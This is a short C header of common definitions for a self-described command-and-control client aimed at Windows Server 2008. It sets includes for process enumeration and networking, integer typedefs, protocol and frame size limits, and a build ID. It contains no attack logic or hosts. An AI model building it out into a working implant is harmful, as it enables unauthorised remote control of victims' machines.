/* C2 native client - common definitions.
 * Target: Windows Server 2008 SP1 x64 (NT 6.0.6001), MSVCRT based build.
 * No hardcoded infrastructure: all endpoints come from config/build injection.
 */
#ifndef C2_COMMON_H
#define C2_COMMON_H

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#ifndef WINVER
#define WINVER 0x0600
#endif
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <iphlpapi.h>
#include <psapi.h>
#endif

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

typedef unsigned char       u8;
typedef unsigned short      u16;
typedef unsigned int        u32;
typedef unsigned long long  u64;
typedef signed char         i8;
typedef short               i16;
typedef int                 i32;
typedef long long           i64;

#define C2_PROTO_VERSION   1u
#define C2_MAX_PAYLOAD     (1024u * 1024u)      /* hard cap for one logical message */
#define C2_MAX_FRAME       65535u               /* hard cap for one websocket frame */

#ifndef C2_BUILD_ID
#define C2_BUILD_ID "dev"
#endif

#endif /* C2_COMMON_H */
